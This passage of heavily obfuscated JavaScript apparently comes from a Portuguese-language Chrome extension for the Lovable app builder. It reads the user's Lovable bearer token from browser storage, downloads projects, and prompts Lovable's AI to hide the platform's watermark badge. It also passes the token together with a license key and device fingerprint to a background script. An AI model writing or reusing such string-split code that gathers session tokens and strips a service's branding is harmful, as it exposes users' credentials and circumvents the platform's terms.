const _n41bcee=await fetch('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'pro'+'jec'+'ts/'+encodeURIComponent(_n32f6df)+('/do'+'wnl'+'oad'+'-zi'+'p'),_n33ffe3);
if(!_n41bcee['ok']){
let _n15bc7a='';
try{
_n15bc7a=await _n41bcee['tex'+'t']();
}
catch(_n48abab){
}
return{
'ok':![],'error':'HTT'+'P\x20'+_n41bcee['sta'+'tus']+(_n15bc7a?':\x20'+_n15bc7a['sub'+'str'+'ing'](0x0,0x78):'')}
;
}
const _n4db1b3=await _n41bcee['blo'+'b'](),_n5bf055=URL['cre'+'ate'+'Obj'+'ect'+'URL'](_n4db1b3),_n267627=document['cre'+'ate'+'Ele'+'men'+'t']('a');
_n267627['sty'+'le']['dis'+'pla'+'y']='non'+'e',_n267627['hre'+'f']=_n5bf055,_n267627['dow'+'nlo'+'ad']='pro'+'jec'+'t-'+_n32f6df['sub'+'str'+'ing'](0x0,0x8)+('.zi'+'p'),document['bod'+'y']['app'+'end'+'Chi'+'ld'](_n267627),_n267627['cli'+'ck'](),setTimeout(()=>{
try{
URL['rev'+'oke'+'Obj'+'ect'+'URL'](_n5bf055),_n267627['rem'+'ove']();
}
catch(_n2789f6){
}
}
,0x190);
const _n3f572f={
}
;
return _n3f572f['ok']=!![],_n3f572f;
}
catch(_n5224fe){
const _n1c4049={
}
;
return _n1c4049['ok']=![],_n1c4049['err'+'or']=_n5224fe&&_n5224fe['mes'+'sag'+'e']?_n5224fe['mes'+'sag'+'e']:'err'+'o\x20d'+'esc'+'onh'+'eci'+'do',_n1c4049;
}
}
,'args':[_n5aca0e,_n1b8e93]}
),_n4e69f1=_n567040&&_n567040[0x0]&&_n567040[0x0]['res'+'ult'];
if(_n4e69f1&&_n4e69f1['ok'])_n400ca0('✅\x20D'+'own'+'loa'+'d\x20i'+'nic'+'iad'+'o!\x20'+'Ver'+'ifi'+'que'+'\x20su'+'a\x20p'+'ast'+'a\x20d'+'e\x20d'+'own'+'loa'+'ds.','ok',0x1388);
else{
const _n45c03e=_n4e69f1&&_n4e69f1['err'+'or']||'Fal'+'ha\x20'+'no\x20'+'dow'+'nlo'+'ad.'+'\x20Te'+'nte'+'\x20no'+'vam'+'ent'+'e.';
_n400ca0('✗\x20'+_n45c03e,'err'+'or',0x1b58);
}
}
catch(_n14a99a){
_n400ca0('✗\x20'+(_n14a99a['mes'+'sag'+'e']||_n14a99a),'err'+'or',0x1388);
}
finally{
_n582c43['dis'+'abl'+'ed']=![],_n582c43['inn'+'erH'+'TML']=_nb196d7;
}
}
async function _n33e4cd(){
const _n4da239=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'dow'+'nlo'+'ad-'+'pro'+'jec'+'t-b'+'tn');
if(!_n4da239)return;
const _n54b612=_n4da239['inn'+'erH'+'TML'];
_n4da239['dis'+'abl'+'ed']=!![],_n4da239['inn'+'erH'+'TML']='<sp'+'an>'+'⏳</'+'spa'+'n>\x20'+'Bai'+'xan'+'do.'+'..';
try{
await new Promise(_n1c799b=>_n5e6fc4(()=>_n1c799b()));
const _n4e0171=await new Promise(_n3eda1d=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id'],_n3eda1d));
let _n50aed6=_n39b796||_n4e0171['lov'+'abl'+'e_t'+'oke'+'n']||'';
if(!_n50aed6){
await new Promise(_n12d1bc=>setTimeout(_n12d1bc,0x320));
const _n39c702=await new Promise(_n1f2c79=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['lov'+'abl'+'e_t'+'oke'+'n'],_n1f2c79));
_n50aed6=_n39c702['lov'+'abl'+'e_t'+'oke'+'n']||'';
}
if(!_n50aed6){
_n176391('⚠\x20T'+'oke'+'n\x20n'+'ão\x20'+'enc'+'ont'+'rad'+'o.\x20'+'Abr'+'a\x20q'+'ual'+'que'+'r\x20a'+'ba\x20'+'do\x20'+'Lov'+'abl'+'e\x20p'+'rim'+'eir'+'o.');
return;
}
if(_n50aed6['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n50aed6=_n50aed6['sli'+'ce'](0x7);
try{
const _n1917a5=_n50aed6['spl'+'it']('.');
if(_n1917a5['len'+'gth']===0x3){
const _n578354=JSON['par'+'se'](atob(_n1917a5[0x1]['rep'+'lac'+'e'](/-/g,'+')['rep'+'lac'+'e'](/_/g,'/')));
if(_n578354['exp']&&_n578354['exp']*0x3e8<Date['now']()){
_n176391('⚠\x20T'+'oke'+'n\x20e'+'xpi'+'rad'+'o.\x20'+'Dê\x20'+'F5\x20'+'num'+'a\x20a'+'ba\x20'+'do\x20'+'Lov'+'abl'+'e\x20e'+'\x20te'+'nte'+'\x20no'+'vam'+'ent'+'e.');
return;
}
}
}
catch(_n33bee1){
}
const _n425332=_n2b5999||_n4e0171['lov'+'abl'+'e_p'+'roj'+'ect'+'Id']||'';
if(!_n425332){
_n176391('⚠\x20P'+'roj'+'eto'+'\x20nã'+'o\x20i'+'den'+'tif'+'ica'+'do.'+'\x20Ab'+'ra\x20'+'o\x20p'+'roj'+'eto'+'\x20no'+'\x20Lo'+'vab'+'le\x20'+'pri'+'mei'+'ro.');
return;
}
_n4da239['inn'+'erH'+'TML']='<sp'+'an>'+'⏳</'+'spa'+'n>\x20'+'Bus'+'can'+'do.'+'..';
const _n5f2668={
}
;
_n5f2668['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n50aed6;
const _n52836={
}
;
_n52836['met'+'hod']='GET',_n52836['hea'+'der'+'s']=_n5f2668;
const _n4daaf4=await _n530b76('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'pro'+'jec'+'ts/'+_n425332,_n52836);
let _n1fd11b=null;
if(_n4daaf4['ok']){
const _n53afe4=_n4daaf4['dat'+'a']||{
}
,_nc727d=_n53afe4['git'+'hub'+'_re'+'po']||_n53afe4['git'+'hub'+'_re'+'pos'+'ito'+'ry']||_n53afe4['rep'+'o']||_n53afe4['rep'+'osi'+'tor'+'y']||_n53afe4['git'+'hub']&&_n53afe4['git'+'hub']['rep'+'o']||_n53afe4['git']&&_n53afe4['git']['rep'+'o'],_nc029a6=_n53afe4['git'+'hub'+'_ow'+'ner']||_n53afe4['git'+'hub'+'_us'+'er']||_n53afe4['git'+'hub']&&_n53afe4['git'+'hub']['own'+'er']||_n53afe4['git']&&_n53afe4['git']['own'+'er'],_n232e05=_n53afe4['bra'+'nch']||_n53afe4['def'+'aul'+'t_b'+'ran'+'ch']||'mai'+'n';
if(_nc727d&&_nc029a6)_n1fd11b='htt'+'ps:'+'//g'+'ith'+'ub.'+'com'+'/'+_nc029a6+'/'+_nc727d+('/ar'+'chi'+'ve/'+'ref'+'s/h'+'ead'+'s/')+_n232e05+('.zi'+'p');
else _nc727d&&_nc727d['inc'+'lud'+'es']('/')&&(_n1fd11b='htt'+'ps:'+'//g'+'ith'+'ub.'+'com'+'/'+_nc727d+('/ar'+'chi'+'ve/'+'ref'+'s/h'+'ead'+'s/')+_n232e05+('.zi'+'p'));
}
if(_n1fd11b){
const _n160917={
}
;
_n160917['url']=_n1fd11b,chrome['tab'+'s']['cre'+'ate'](_n160917),_n176391(spT('toa'+'st_'+'dow'+'nlo'+'ad_'+'git'+'hub'));
return;
}
const _n46c75e={
}
;
_n46c75e['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n50aed6;
const _n40521a={
}
;
_n40521a['met'+'hod']='GET',_n40521a['hea'+'der'+'s']=_n46c75e;
const _n7b82e3=await _n530b76('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'pro'+'jec'+'ts/'+_n425332+('/ex'+'por'+'t'),_n40521a);
if(_n7b82e3['ok']){
const _n56c173=_n7b82e3['dat'+'a']||{
}
,_n194cf4=_n56c173['dow'+'nlo'+'ad_'+'url']||_n56c173['url']||_n56c173['zip'+'_ur'+'l']||_n56c173['exp'+'ort'+'_ur'+'l']||_n56c173['arc'+'hiv'+'e_u'+'rl']||_n56c173['hre'+'f']||(typeof _n56c173==='str'+'ing'&&_n56c173['sta'+'rts'+'Wit'+'h']('htt'+'p')?_n56c173:null);
if(_n194cf4){
const _n3ca8d8={
}
;
_n3ca8d8['url']=_n194cf4,chrome['tab'+'s']['cre'+'ate'](_n3ca8d8),_n176391(spT('toa'+'st_'+'dow'+'nlo'+'ad_'+'sta'+'rte'+'d'));
return;
}
}
const _n1c2eb6=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'res'+'pon'+'se-'+'box');
_n1c2eb6&&(_n1c2eb6['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er;
'+'pad'+'din'+'g:4'+'px\x20'+'0\x208'+'px\x22'+'>'+('<sp'+'an\x20'+'sty'+'le='+'\x22fo'+'nt-'+'siz'+'e:2'+'2px'+'\x22>🔗'+'</s'+'pan'+'>')+('</d'+'iv>')+('<di'+'v\x20s'+'tyl'+'e=\x22'+'fon'+'t-w'+'eig'+'ht:'+'800'+';
fo'+'nt-'+'siz'+'e:1'+'2px'+';
co'+'lor'+':#f'+'ff;
'+'mar'+'gin'+'-bo'+'tto'+'m:8'+'px;
'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er\x22'+'>')+('Con'+'ect'+'e\x20s'+'eu\x20'+'pro'+'jet'+'o\x20a'+'o\x20G'+'itH'+'ub\x20'+'par'+'a\x20b'+'aix'+'ar!')+('</d'+'iv>')+('<ol'+'\x20st'+'yle'+'=\x22m'+'arg'+'in:'+'0;
p'+'add'+'ing'+'-le'+'ft:'+'18p'+'x;
f'+'ont'+'-si'+'ze:'+'11p'+'x;
c'+'olo'+'r:r'+'gba'+'(25'+'5,2'+'55,'+'255'+',.7'+');
l'+'ine'+'-he'+'igh'+'t:1'+'.7\x22'+'>')+('<li'+'>Ab'+'ra\x20'+'o\x20p'+'roj'+'eto'+'\x20no'+'\x20Lo'+'vab'+'le<'+'/li'+'>')+('<li'+'>Cl'+'iqu'+'e\x20e'+'m\x20<'+'str'+'ong'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'fff'+'\x22>G'+'itH'+'ub<'+'/st'+'ron'+'g>\x20'+'no\x20'+'men'+'u\x20s'+'upe'+'rio'+'r</'+'li>')+('<li'+'>Co'+'nec'+'te\x20'+'seu'+'\x20re'+'pos'+'itó'+'rio'+'</l'+'i>')+('<li'+'>Cl'+'iqu'+'e\x20e'+'m\x20<'+'str'+'ong'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'fff'+'\x22>⬇️'+'\x20Ba'+'ixa'+'r\x20P'+'roj'+'eto'+'</s'+'tro'+'ng>'+'\x20no'+'vam'+'ent'+'e</'+'li>')+('</o'+'l>'),_n1c2eb6['cla'+'ssL'+'ist']['add']('vis'+'ibl'+'e'));
}
catch(_n453b0a){
const _n22eb9e=_n453b0a['mes'+'sag'+'e']||String(_n453b0a);
if(/license_invalid:/i['tes'+'t'](_n22eb9e)){
_n4ce99a(_n22eb9e['rep'+'lac'+'e'](/^.*license_invalid:\s*/i,''));
return;
}
_n176391('✗\x20'+_n22eb9e);
}
finally{
_n4da239['dis'+'abl'+'ed']=![],_n4da239['inn'+'erH'+'TML']=_n54b612;
}
}
var _n384826='Adi'+'cio'+'ne\x20'+'no\x20'+'fin'+'al\x20'+'do\x20'+'ind'+'ex\x20'+'css'+':\x20#'+'lov'+'abl'+'e-b'+'adg'+'e\x20{
'+'\x0a'+('dis'+'pla'+'y:\x20'+'non'+'e\x20!'+'imp'+'ort'+'ant'+';
\x0a')+'}
';
async function _n44045a(){
const _n56f677=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'rem'+'ove'+'-wa'+'ter'+'mar'+'k');
if(!_n56f677)return;
_n56f677['dis'+'abl'+'ed']=!![],_n56f677['tex'+'tCo'+'nte'+'nt']='⏳\x20E'+'nvi'+'and'+'o..'+'.';
try{
await new Promise(_n1e5795=>_n5e6fc4(()=>_n1e5795()));
const _n36160c=await new Promise(_nfb054f=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'ck','ql_'+'ed'],_nfb054f)),_n39254e=_n36160c['ql_'+'ck']||_n36160c['ql_'+'lk']||'',_nb4b02d=await _n19b41c()||_n36160c['ql_'+'ed']||_n2f3531||'';
let _n13603d=_n39b796||'',_n56ed9d=_n2b5999||'';
(!_n56ed9d||!_n13603d)&&(await new Promise(_n2e8f6f=>setTimeout(_n2e8f6f,0x320)),await new Promise(_n508bcf=>_n5e6fc4(()=>_n508bcf())),_n13603d=_n39b796||'',_n56ed9d=_n2b5999||'');
if(!_n56ed9d||!_n13603d){
_n176391('⚠\x20T'+'oke'+'n\x20d'+'o\x20L'+'ova'+'ble'+'\x20nã'+'o\x20c'+'apt'+'ura'+'do.'+'\x20Ab'+'ra\x20'+'uma'+'\x20ab'+'a\x20d'+'o\x20L'+'ova'+'ble'+'\x20co'+'m\x20o'+'\x20pr'+'oje'+'to\x20'+'ati'+'vo\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.'),_n56f677['dis'+'abl'+'ed']=![],_n56f677['tex'+'tCo'+'nte'+'nt']='🚫\x20R'+'emo'+'ver'+'\x20ma'+'rca'+'\x20D\x27'+'águ'+'a';
return;
}
if(_n13603d['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n13603d=_n13603d['sli'+'ce'](0x7);
try{
const _n4b318a=_n13603d['spl'+'it']('.');
if(_n4b318a['len'+'gth']===0x3){
const _n2593e6=JSON['par'+'se'](atob(_n4b318a[0x1]['rep'+'lac'+'e'](/-/g,'+')['rep'+'lac'+'e'](/_/g,'/')));
if(_n2593e6['exp']&&_n2593e6['exp']*0x3e8<Date['now']()){
_n176391('⚠\x20T'+'oke'+'n\x20e'+'xpi'+'rad'+'o.\x20'+'Dê\x20'+'F5\x20'+'na\x20'+'aba'+'\x20do'+'\x20Lo'+'vab'+'le\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.'),_n56f677['dis'+'abl'+'ed']=![],_n56f677['tex'+'tCo'+'nte'+'nt']='🚫\x20R'+'emo'+'ver'+'\x20ma'+'rca'+'\x20D\x27'+'águ'+'a';
return;
}
}
}
catch(_n509a7b){
}
const _n2a3f60={
}
;
_n2a3f60['use'+'r_l'+'ice'+'nse'+'_ke'+'y']=_n39254e,_n2a3f60['ses'+'sio'+'n_i'+'d']=_n6a372d||_n36160c['ql_'+'ses'+'sio'+'n_i'+'d'],_n2a3f60['dev'+'ice'+'_id']=_nb4b02d,_n2a3f60['pro'+'jet'+'o_i'+'d']=_n56ed9d,_n2a3f60['tok'+'en_'+'lov'+'abl'+'e']=_n13603d,_n2a3f60['men'+'sag'+'em']=_n384826,_n2a3f60['vie'+'w']='pre'+'vie'+'w',_n2a3f60['vie'+'w_d'+'esc'+'rip'+'tio'+'n']='The'+'\x20us'+'er\x20'+'is\x20'+'cur'+'ren'+'tly'+'\x20vi'+'ewi'+'ng\x20'+'the'+'\x20pr'+'evi'+'ew.'+'\x20',_n2a3f60['lov'+'abl'+'e_m'+'ode'+'l']='cla'+'ude'+'-op'+'us-'+'4-5';
const _n461f54=_n2a3f60,_n4890a2=Date['now']()+0x9c40;
let _n57a996=0x0;
while(!![]){
_n57a996++;
if(_n57a996>0x1){
await new Promise(_n2408b8=>_n5e6fc4(()=>_n2408b8()));
if(_n39b796){
let _n3a68b7=_n39b796;
if(_n3a68b7['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n3a68b7=_n3a68b7['sli'+'ce'](0x7);
_n461f54['tok'+'en_'+'lov'+'abl'+'e']=_n3a68b7;
}
if(_n2b5999)_n461f54['pro'+'jet'+'o_i'+'d']=_n2b5999;
}
let _nf4d6c0=null;
try{
const _n49f4a5=await new Promise((_n16e864,_n12d068)=>{
const _n44316e={
}
;
_n44316e['act'+'ion']='sen'+'dMe'+'ssa'+'ge',_n44316e['mes'+'sag'+'e']=_n461f54['men'+'sag'+'em'],_n44316e['pro'+'jec'+'tId']=_n461f54['pro'+'jet'+'o_i'+'d'],_n44316e['tok'+'en']=_n461f54['tok'+'en_'+'lov'+'abl'+'e'],_n44316e['att'+'ach'+'men'+'ts']=[],_n44316e['opt'+'imi'+'sti'+'cUr'+'ls']=[],_n44316e['his'+'tor'+'yBu'+'ffe'+'r']=[],_n44316e['con'+'tex'+'tCl'+'ass']='ato'+'mic',_n44316e['lic'+'ens'+'eKe'+'y']=_n39254e,_n44316e['dev'+'ice'+'Fin'+'ger'+'pri'+'nt']=_nb4b02d,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n44316e,_n2c1862=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])_n12d068(new Error(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']||'Err'+'o\x20d'+'e\x20c'+'omu'+'nic'+'açã'+'o\x20c'+'om\x20'+'o\x20b'+'ack'+'gro'+'und'));
else{
const _n2e30eb={
}
;
_n2e30eb['suc'+'ces'+'s']=![],_n2e30eb['ok']=![],_n2e30eb['err'+'or']='Sem'+'\x20re'+'spo'+'sta'+'\x20do'+'\x20ba'+'ckg'+'rou'+'nd',_n16e864(_n2c1862||_n2e30eb);
}
}
);
}
),_n16a99c=_n1f65c2(_n49f4a5);
if(_n16a99c==='__u'+'pda'+'te_'+'req'+'uir'+'ed_'+'_')return;
if(_n16a99c)throw new Error(_n16a99c);
_n176391(spT('toa'+'st_'+'wat'+'erm'+'ark'+'_re'+'mov'+'ed'));
break;
}
catch(_n583e67){
_nf4d6c0=_n583e67;
}
const _n38ed8d=_nf4d6c0['mes'+'sag'+'e']||String(_nf4d6c0);
if(/license_invalid:/i['tes'+'t'](_n38ed8d)||/403|http_403/['tes'+'t'](_n38ed8d)||/captcha_required|payment_required/i['tes'+'t'](_n38ed8d))throw _nf4d6c0;
const _n2b209e=_n4890a2-Date['now'](),_n105b43=/429|http_429/['tes'+'t'](_n38ed8d)?0xdac:0x7d0;
if(_n2b209e<=_n105b43||_n57a996>=0x5)throw _nf4d6c0;
await new Promise(_neb4a8c=>setTimeout(_neb4a8c,_n105b43));
}
}
catch(_n5c536e){
const _n2f12dc=_n5c536e['mes'+'sag'+'e']||String(_n5c536e);
if(/license_invalid:/i['tes'+'t'](_n2f12dc)){
_n4ce99a(_n2f12dc['rep'+'lac'+'e'](/^.*license_invalid:\s*/i,''));
return;
}
if(/captcha_required/i['tes'+'t'](_n2f12dc)){
_n176391(spT('err'+'or_'+'cap'+'tch'+'a_r'+'equ'+'ire'+'d'));
return;
}
if(/payment_required/i['tes'+'t'](_n2f12dc)){
_n176391(spT('err'+'or_'+'pay'+'men'+'t_r'+'equ'+'ire'+'d'));
return;
}
_n176391('✗\x20'+_n2f12dc);
}
finally{
_n56f677['dis'+'abl'+'ed']=![],_n56f677['tex'+'tCo'+'nte'+'nt']='🚫\x20R'+'emo'+'ver'+'\x20ma'+'rca'+'\x20D\x27'+'águ'+'a';
}
}
async function _n2eacfe(){
if(_n443c3a)return;
_n443c3a=!![];
const _n6ccf92=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'sen'+'d');
_n6ccf92&&(window['_sp'+'Ret'+'ryT'+'ime'+'r']&&(clearTimeout(window['_sp'+'Ret'+'ryT'+'ime'+'r']),window['_sp'+'Ret'+'ryT'+'ime'+'r']=null),_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'btn'+'-re'+'try'),_n6ccf92['dis'+'abl'+'ed']=!![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='⚡\x20E'+'nvi'+'and'+'o..'+'.',_n6ccf92['cla'+'ssL'+'ist']['add']('ql-'+'sen'+'d-b'+'lin'+'k'));
const _n24a102=await new Promise(_n528978=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lic'+'ens'+'e_v'+'ali'+'d','ql_'+'lk','ql_'+'ck'],_n528978));
if(!_n24a102['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']||!_n24a102['ql_'+'lk']||!_n24a102['ql_'+'ck']){
_n443c3a=![],_n4ce99a(spT('log'+'in_'+'inv'+'ali'+'d_r'+'elo'+'gin'));
return;
}
const _n1db480=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg'),_n54c487=_n1db480?_n1db480['val'+'ue']['tri'+'m']():'',_n528ee1=_ne62fcc['som'+'e'](_n522306=>_n522306['upl'+'oad'+'ing']);
if(_n528ee1){
_n443c3a=![],_n176391('⏳\x20A'+'gua'+'rde'+'\x20o\x20'+'upl'+'oad'+'\x20do'+'s\x20a'+'rqu'+'ivo'+'s..'+'.');
return;
}
if(!_n54c487&&_ne62fcc['len'+'gth']===0x0){
_n443c3a=![],_n176391('⚠\x20P'+'rom'+'pt\x20'+'vaz'+'io');
return;
}
const _n116777=_ne62fcc['fil'+'ter'](_n5625d0=>!_n5625d0['upl'+'oad'+'ing']&&!_n5625d0['upl'+'oad'+'Fai'+'led']&&_n5625d0['fil'+'e_i'+'d'])['map'](_n258597=>{
const _n4be1d6=_n258597['mim'+'e_t'+'ype']||_n258597['fil'+'e_t'+'ype']||'app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam',_n4a066c=_n258597['pub'+'lic'+'Url']||_n258597['dow'+'nlo'+'ad_'+'url']||null,_n4e96e8={
}
;
return _n4e96e8['fil'+'e_i'+'d']=_n258597['fil'+'e_i'+'d'],_n4e96e8['fil'+'e_n'+'ame']=_n258597['fil'+'e_n'+'ame'],_n4e96e8['nam'+'e']=_n258597['fil'+'e_n'+'ame'],_n4e96e8['fil'+'e_t'+'ype']=_n4be1d6,_n4e96e8['typ'+'e']=_n4be1d6,_n4e96e8['fil'+'e_u'+'rl']=_n4a066c,_n4e96e8['url']=_n4a066c,_n4e96e8['mim'+'e_t'+'ype']=_n4be1d6,_n4e96e8['dow'+'nlo'+'ad_'+'url']=_n4a066c,_n4e96e8;
}
),_n2cacbd=_ne62fcc['fil'+'ter'](_n2b2e3c=>!_n2b2e3c['upl'+'oad'+'ing']&&!_n2b2e3c['upl'+'oad'+'Fai'+'led']&&!_n2b2e3c['fil'+'e_i'+'d']&&_n2b2e3c['pub'+'lic'+'Url']),_n5b7332=[..._n116777['fil'+'ter'](_n5c34ac=>_n5c34ac['fil'+'e_u'+'rl']&&(_n5c34ac['fil'+'e_t'+'ype']||'')['sta'+'rts'+'Wit'+'h']('ima'+'ge/'))['map'](_n170cbd=>_n170cbd['fil'+'e_u'+'rl']),..._n2cacbd['fil'+'ter'](_n189957=>UploadManager['isI'+'mag'+'eTy'+'pe'](_n189957['fil'+'e_t'+'ype']||_n189957['mim'+'e_t'+'ype']||'')&&_n189957['pub'+'lic'+'Url'])['map'](_n1acbf8=>_n1acbf8['pub'+'lic'+'Url'])];
try{
const _n3d1e2e=0x7d0,_n4ca570=Date['now']()-_n10870e;
if(_n10870e>0x0&&_n4ca570<_n3d1e2e){
const _n326e6c=_n3d1e2e-_n4ca570;
_n400ca0('⏳\x20A'+'gua'+'rde'+'\x20al'+'gun'+'s\x20s'+'egu'+'ndo'+'s\x20a'+'pós'+'\x20o\x20'+'upl'+'oad'+'\x20an'+'tes'+'\x20de'+'\x20en'+'via'+'r..'+'.','war'+'n',_n326e6c+0x320),await new Promise(_n59dcf7=>setTimeout(_n59dcf7,_n326e6c));
}
const _n3eb8ef=0x7d0,_nfc0eca=Date['now']()-_n20609f;
if(_n20609f>0x0&&_nfc0eca<_n3eb8ef){
const _n2302eb=_n3eb8ef-_nfc0eca;
_n400ca0('⏳\x20I'+'nte'+'rva'+'lo\x20'+'ent'+'re\x20'+'env'+'ios'+',\x20a'+'gua'+'rde'+'\x20al'+'gun'+'s\x20s'+'egu'+'ndo'+'s..'+'.','war'+'n',_n2302eb+0x1f4),await new Promise(_n1bd7cd=>setTimeout(_n1bd7cd,_n2302eb));
}
await new Promise(_n119401=>_n5e6fc4(()=>_n119401()));
const _n143c7a=await new Promise(_n250f38=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lk','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'ck','ql_'+'ed','ql_'+'bro'+'wse'+'r_s'+'ess'+'ion'+'_id','ql_'+'git'+'_sh'+'a'],_n250f38));
let _n46e207=_n39b796||'',_n6f14ad=_n2b5999||'';
const _n3ec621=_n143c7a['ql_'+'ck']||_n143c7a['ql_'+'lk']||'',_n41f7ef=_n143c7a['ql_'+'ed']||_n2f3531||'',_nf22958=_n143c7a['ql_'+'bro'+'wse'+'r_s'+'ess'+'ion'+'_id']||'',_n5d6983=_n143c7a['ql_'+'git'+'_sh'+'a']||'';
(!_n6f14ad||!_n46e207)&&(await new Promise(_n465b3d=>setTimeout(_n465b3d,0x1f4)),await new Promise(_n5a0381=>_n5e6fc4(()=>_n5a0381())),_n46e207=_n39b796||'',_n6f14ad=_n2b5999||'');
(!_n6f14ad||!_n46e207)&&(await new Promise(_n3a0f82=>_n2b6173(()=>_n3a0f82())),_n46e207=_n39b796||'',_n6f14ad=_n2b5999||'');
for(var _n50721e=0x0;
_n50721e<0x3&&(!_n46e207||!_n6f14ad);
_n50721e++){
await new Promise(_n8f4b67=>setTimeout(_n8f4b67,0x4b0)),await new Promise(_n3e26a1=>_n2b6173(()=>_n3e26a1())),_n46e207=_n39b796||'',_n6f14ad=_n2b5999||'';
}
if(!_n6f14ad||!_n46e207){
_n176391('⚠\x20T'+'oke'+'n\x20d'+'o\x20L'+'ova'+'ble'+'\x20nã'+'o\x20c'+'apt'+'ura'+'do.'+'\x20Ab'+'ra\x20'+'um\x20'+'pro'+'jet'+'o\x20n'+'o\x20L'+'ova'+'ble'+'\x20e\x20'+'ten'+'te\x20'+'nov'+'ame'+'nte'+'.');
_n6ccf92&&(_n6ccf92['dis'+'abl'+'ed']=![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='Env'+'iar',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'sen'+'d-b'+'lin'+'k'));
return;
}
if(_n46e207['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n46e207=_n46e207['sli'+'ce'](0x7);
try{
const _n5ee352=_n46e207['spl'+'it']('.');
if(_n5ee352['len'+'gth']===0x3){
const _n1fa1db=JSON['par'+'se'](atob(_n5ee352[0x1]['rep'+'lac'+'e'](/-/g,'+')['rep'+'lac'+'e'](/_/g,'/')));
if(_n1fa1db['exp']&&_n1fa1db['exp']*0x3e8<Date['now']()){
_n176391('⚠\x20T'+'oke'+'n\x20e'+'xpi'+'rad'+'o.\x20'+'Dê\x20'+'F5\x20'+'na\x20'+'aba'+'\x20do'+'\x20Lo'+'vab'+'le\x20'+'e\x20t'+'ent'+'e\x20n'+'ova'+'men'+'te.');
_n6ccf92&&(_n6ccf92['dis'+'abl'+'ed']=![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='Env'+'iar',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'sen'+'d-b'+'lin'+'k'));
return;
}
}
}
catch(_nce05f0){
}
const _n3b7d24=_n2cacbd['len'+'gth']>0x0?_n2cacbd['len'+'gth']===0x1?'\x0a\x0aA'+'nal'+'ise'+'\x20EX'+'CLU'+'SIV'+'AME'+'NTE'+'\x20o\x20'+'arq'+'uiv'+'o\x20n'+'o\x20l'+'ink'+'\x20a\x20'+'seg'+'uir'+',\x20i'+'gno'+'ran'+'do\x20'+'his'+'tór'+'ico'+'\x20ou'+'\x20co'+'nte'+'xto'+'\x20vi'+'sua'+'l\x20a'+'nte'+'rio'+'r:\x20'+_n2cacbd[0x0]['pub'+'lic'+'Url']:'\x0a\x0aA'+'nal'+'ise'+'\x20EX'+'CLU'+'SIV'+'AME'+'NTE'+'\x20os'+'\x20ar'+'qui'+'vos'+'\x20no'+'s\x20l'+'ink'+'s\x20a'+'\x20se'+'gui'+'r,\x20'+'ign'+'ora'+'ndo'+'\x20hi'+'stó'+'ric'+'o\x20o'+'u\x20c'+'ont'+'ext'+'o\x20v'+'isu'+'al\x20'+'ant'+'eri'+'or:'+'\x0a'+_n2cacbd['map'](_n4bff15=>_n4bff15['pub'+'lic'+'Url'])['joi'+'n']('\x0a'):'',_n1010ae=_n116777['len'+'gth']>0x0||_n2cacbd['len'+'gth']>0x0,_n596593=_n116777['som'+'e'](_n229f46=>(_n229f46['fil'+'e_t'+'ype']||'')['sta'+'rts'+'Wit'+'h']('ima'+'ge/'))||_n2cacbd['som'+'e'](_n1c4ef0=>UploadManager['isI'+'mag'+'eTy'+'pe'](_n1c4ef0['fil'+'e_t'+'ype']||_n1c4ef0['mim'+'e_t'+'ype']||'')),_n48fc53=_n116777['fil'+'ter'](_n2192bf=>_n2192bf['pub'+'lic'+'Url']&&UploadManager['isI'+'mag'+'eTy'+'pe'](_n2192bf['fil'+'e_t'+'ype']||_n2192bf['mim'+'e_t'+'ype']||''))['map'](_n435483=>'\x0aBa'+'cku'+'p\x20S'+'upa'+'bas'+'e:\x20'+_n435483['pub'+'lic'+'Url'])['joi'+'n'](''),_n23a822=_n48fc53,_n165bfd=0x8,_n31c5d2=_n1bd680['sli'+'ce'](-_n165bfd),_n184883='[Co'+'nte'+'xto'+'\x20re'+'cen'+'te\x20'+'da\x20'+'ses'+'sao'+']\x0aC'+'oma'+'ndo'+'\x20at'+'ual'+':\x0a',_n56faee=_n31c5d2['fil'+'t